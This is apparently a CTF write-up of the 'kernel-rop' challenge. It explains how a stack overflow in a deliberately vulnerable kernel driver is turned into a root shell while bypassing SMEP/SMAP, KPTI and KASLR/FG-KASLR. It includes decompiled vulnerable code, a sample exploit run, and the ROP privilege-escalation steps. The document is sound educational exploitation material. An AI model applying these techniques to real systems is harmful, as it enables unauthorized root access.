# General Kernel Protections and Kernel-ROP Writeup/Report

## Dependencies

Developed/tested on Ubuntu 22.04
- gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0: `sudo apt install build-essential`
- qemu-system-x86_64 6.2.0 (Debian 1:6.2+dfsg-2ubuntu6.22): `apt-get install qemu-system`
- cpio (GNU cpio) 2.13: `apt install cpio`


## Instructions

```
# Decompress the initrd filesystem
./decomp.sh
# Re-compress the initrd filesystem with compiled exploit
./compress.sh
# Emulate the filesystem using bash script with re-compressed initrd
# run.sh emulates kernel with full-protections
./run.sh initramfs-mod.cpio.gz
# In emulation, run ./exploit binary to gain root shell
./exploit
```

#### Exploit Example
```
/ $ whoami
whoami: unknown uid 1000
/ $ ./exploit 
[+] Beginning leak:
	Offset:	Leak Data
	0x0:	0xffffb8b8801bfe19
	0x8:	0xffffffffbb400cc2
	0x10:	0x8ba8e5bc59f0fe00  CANARY CANDIDATE
	0x18:	0xffff89d086884310
	0x20:	0xffffb8b8801bfe68
	0x28:	0x0000000000000004
	0x30:	0xffff89d086884300
	0x38:	0xffffb8b8801bfef0
	0x40:	0xffff89d086884300
	0x48:	0xffffb8b8801bfe80
	0x50:	0xffffffffbb610997
	0x58:	0xffffffffbb610997
	0x60:	0xffff89d086884300
	0x68:	0x0000000000000000
	0x70:	0x00007fffd60be3d0
	0x78:	0xffffb8b8801bfea0
	0x80:	0x8ba8e5bc59f0fe00  CANARY CANDIDATE
	0x88:	0x0000000000000180
	0x90:	0x0000000000000000
	0x98:	0xffffb8b8801bfed8
	0xa0:	0xffffffffbb7a231f
	0xa8:	0xffff89d086884300
	0xb0:	0xffff89d086884300
	0xb8:	0x00007fffd60be3d0
	0xc0:	0x0000000000000180
	0xc8:	0x0000000000000000
	0xd0:	0xffffb8b8801bff20
	0xd8:	0xffffffffbb8d5c97
	0xe0:	0xffffffffbb87d6b1
	0xe8:	0x0000000000000000
	0xf0:	0x8ba8e5bc59f0fe00  CANARY CANDIDATE
	0xf8:	0xffffb8b8801bff58
	0x100:	0x0000000000000000
	0x108:	0x0000000000000000
	0x110:	0x0000000000000000
	0x118:	0xffffb8b8801bff30
	0x120:	0xffffffffbbc4694a
	0x128:	0xffffb8b8801bff48
	0x130:	0xffffffffbb20a157[+] Kernel Base: ffffffffbb200000
	0x138:	0x0000000000000000
	0x140:	0x0000000000000000
	0x148:	0xffffffffbb40008c
	0x150:	0x0000000000000001
	0x158:	0x00000000004c57d0
	0x160:	0x00007fffd60be808
	0x168:	0x0000000000000001
	0x170:	0x00007fffd60be5f0
	0x178:	0x00007fffd60be5a0
[+] Leak complete
[+] Canary: 0x8ba8e5bc59f0fe00
[+] Saving state...
[+] State saved.
Payload size: 416
[+] Delivering payload...
[+] Shell UID: 0
/ # whoami
whoami: unknown uid 0
```

## Introduction

The purpose of this project is to use the CTF `kernel-rop` to learn the basic kernel protections and how to bypass them. `kernel-rop` itself only has a trivial stack overflow vulnerability. The main challenge here is to bypass the protections of the kernel itself to gain full remote code execution. This project was done in parallel to [Learning Linux kernel exploitation - Part 1 - Laying the groundwork](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#kpti).

There are four levels to the project:
1) Exploit with no Kernel Protections
2) Exploit with only SMEP/SMAP enabled
3) Exploit with KPTI && SMEP/SMAP enabled
4) Exploit with full protections (KASLR, KPTI, SMEP/SMAP) enabled

## Kernel Protections and How to Exploit

### Kernel Driver `hackme.ko` Vulnerabilities

The kernel driver contains an overflow in its `hackme_read` and `hackme_write` functions that allow both an relative read and IP overwrite.

`hackme_read` allows an attacker to read past the allocated size for the `tmp` array allowing for a relative read leak of the kernel stack. This can be used to leak the canary and other values on the stack (such as kernel function addresses).

```
ssize_t hackme_read(file *f,char *data,size_t size,loff_t *off)

{
  long lVar1;
  size_t sVar2;
  long in_GS_OFFSET;
  undefined local_a8 [8];
  int tmp [32];
  
  tmp._120_8_ = *(undefined8 *)(in_GS_OFFSET + 0x28);
  __memcpy(hackme_buf,local_a8,size);
  if (0x1000 < size) {
    __warn_printk("Buffer overflow detected (%d < %lu)!\n",0x1000,size);
    do {
      invalidInstructionException();
    } while( true );
  }
  __check_object_size(hackme_buf,size,1);
  lVar1 = _copy_to_user(data,hackme_buf,size);
  ...
}
```

`hackme_read` allows an attacker to write 0x1000 bytes into `int tmp[32]` enabling a large stack overflow. The attacker can utilize this to overwrite the instruction pointer on the stack to allow and gain remote code execution (RCE).

```
ssize_t hackme_write(file *f,char *data,size_t size,loff_t *off)
{
  long lVar1;
  long in_GS_OFFSET;
  undefined local_a8 [8];
  int tmp [32];
  
  tmp._120_8_ = *(undefined8 *)(in_GS_OFFSET + 0x28);
  if (0x1000 < size) {
    __warn_printk("Buffer overflow detected (%d < %lu)!\n",0x1000);
    do {
      invalidInstructionException();
    } while( true );
  }
  __check_object_size(hackme_buf,size,0);
  lVar1 = _copy_from_user(hackme_buf,data,size);
  if (lVar1 == 0) {
    __memcpy(local_a8,hackme_buf,size);
  }
}
```

### No protections

The kernel with no protections gives the attacker more than enough room to turn a stack overflow vulnerability into a full-fledged exploit. With no protections, the kernel is free to directly read and execute in userspace with full privileges. The goal of the attacker then is to elevate the privileges to the user process exploiting `hackme.ko`. This can be done through three steps:

1) Call the kernel function `prepare_kernel_cred` that will prepare a set of credentials for a kernel service. When supplied with a `NULL` parameter, it will return a set of new kernel credentials. See below for the function definition.

```
/**
 * prepare_kernel_cred - Prepare a set of credentials for a kernel service
 * @daemon: A userspace daemon to be used as a reference
 *
 * Prepare a set of credentials for a kernel service.  This can then be used to
 * override a task's own credentials so that work can be done on behalf of that
 * task that requires a different subjective context.
 *
 * @daemon is used to provide a base for the security record, but can be NULL.
 * If @daemon is supplied, then the security data will be derived from that;
 * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
 *
 * The caller may change these controls afterwards if desired.
 *
 * Returns the new credentials or NULL if out of memory.
 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
```

2) Call the kernel function `commit_creds` with the returned kernel credentials from `prepare_kernel_cred` as the first parameter. This will install the new credentials upon the current task elevating the task's privileges. See function definition below.

```
/**
 * commit_creds - Install new credentials upon the current task
 * @new: The credentials to be assigned
 *
 * Install a new set of credentials to the current task, using RCU to replace
 * the old set.  Both the objective and the subjective credentials pointers are
 * updated.  This function may not be called if the subjective credentials are
 * in an overridden state.
 *
 * This function eats the caller's reference to the new credentials.
 *
 * Always returns 0 thus allowing this function to be tail-called at the end
 * of, say, sys_setgid().
 */
int commit_creds(struct cred *new)
```

3) Switch context from kernel to user mode and pop a shell using `swapgs` and `iretq`. With elevated privileges, a call to `system("/bin/sh")` will return a root shell.

No privileges can be emulated by using the `-append "console=ttyS0 nosmep nosmap nopti nokaslr quiet panic=1"` line in run.sh. `exploit-no-protections.c` is the source file for exploiting the kernel driver with no kernel protections.

The exploit first leaks the canary from the relative read vulnerability in `hackme_read`. This will allow the exploit to bypass the canary and overwrite the instruction pointer on the stack. With access to the instruction pointer (IP), the exploit overwrites the IP to code in user land that accomplishes steps 1-3 listed above to escalate privelegs and execute a shell.

### SMEP/SMAP

SMEP/SMAP will be the first kernel protections enabled. Supervisor mode execution protection (SMEP) is a linux kernel security mechanism that prevents execution of userland code while in kernel context. This will stop `exploit-no-protections.c` from working by removing the ability for the kernel to execute our userland privilege escalation code. Supervisor mode access prevention (SMAP) is an extension of SMEP that prevents read and write access to userland memory while the AC flag is set in RFLAGS.

Uncomment the line `-append "console=ttyS0 nopti nokaslr quiet panic=1"` to emulate the kernel with only SMEP/SMAP enabled. The exploit source code for exploiting SMEP/SMAP is `exploit-smep-smap.c`.

The mechanism for bypassing SMEP/SMAP is using return-oriented programming (ROPs). This is a exploitation technique that uses existing gadgets within binaries (in this case, the kernel itself) to gain remote code execution. Essentially, we are leveraging the existing code in the kernel against itself to execute what we want. `exploit-smep-smap.c` now overwrites the IP on the stack with a ROP-chain that executes `prepare_kernel_cred`, `commit_creds`, and the kernel-user context switch to gain a root shell.

### KPTI

The next kernel protection to be enabled is kernel page-table isolation (KPTI). KPTI seperates user-land and kernel-land page tables entirely. There is a page-table dedicated for kernel-land use that contain both kernel and user addresses and another page-table for userland use that contains user addresses and a restricted/limited set of kernel-space mappings that allow for systemm calls, interrupts, and exceptions. The following pictures depicts this:

![kpti](./images/Kernel_page-table_isolation.svg.png)

Two ways have been demonstrated here to bypass KPTI.

First is the KPTI-trampoline technique that utilizes kernel function `swapgs_restore_regs_and_return_to_usermode` that will switch context between kernel and user-dedicated page-tables. `exploit-kpti-tramp.c` demonstrates this by simply replacing the `swapgs` instruction to a call to `swapgs_restore_regs_and_return_to_usermode`.

Second is catching the segfault signal with a signal handler and calling a root shell in the signal handler function. Attempting to execute userland code in the kernel-page context will generate a user segmentation fault. However, we can simply just catch this signal and pop a shell anyways. This is demonstrated in `exploit-kpti-signal-handler.c`.

To emulate KPTI and SMEP/SMAP, uncomment this line in `run.sh`: `-append "console=ttyS0 kpti=1 nokaslr quiet panic=1"`.

### KASLR/FG-KASLR

Kernel address space layout randomization (KASLR) is a protection mechanism that loads the kernel into a random location in memory. This prevents the use of ROP gadgets without a leak of the kernel base address. Fine grained KASLR (FG-KASLR) builds upon this by randomizing function addresses within the kernel itself.

`exploit-full-tramp.c` is the exploit source code against the kernel with full protections. KASLR is defeated by leaking a kernel address located at 0x130 offset from the stack leak. This gives us the base we need to calculate ROP gadget offsets. However, we still need to deal with FG-ASLR. A fortunate fact about FG-KASLR is that not all functions are randomized, so only some ROP gadgets and functions will be affected by this. However, `prepare_kernel_cred` and `commit_creds` are affected.

To determine where these functions are, we must look at their respective `ksymtab` structs that contain their offset value. The struct is defined as follows:

```
// Struct definition
struct kernel_symbol {
    int value_offset;
    int name_offset;
    int namespace_offset;
}
// Location of structs in kernel
/ # cat /proc/kallsyms | grep -E "ksymtab_commit_creds|ksymtab_prepare_kernel_cred"
ffffffffbc187d90 r __ksymtab_commit_creds
ffffffffbc18d4fc r __ksymtab_prepare_kernel_cred
```

To determine the location of a function affected by FG-KASLR (e.g. commit_creds), the location can be determined by adding the offset to the location of the symtab address, i.e. `__ksymtab_commit_creds + __ksymtab_commit_creds->value_offset`. `exploit-full-tramp.c` does this through ROPs to gain a root shell.

## Sources

- [Learning Linux kernel exploitation - Part 1 - Laying the groundwork](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#kpti)
- [SMEP](https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/supervisor-mode-execution-protection-smep)
- [SMAP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention)
- [KPTI](https://en.wikipedia.org/wiki/Kernel_page-table_isolation)
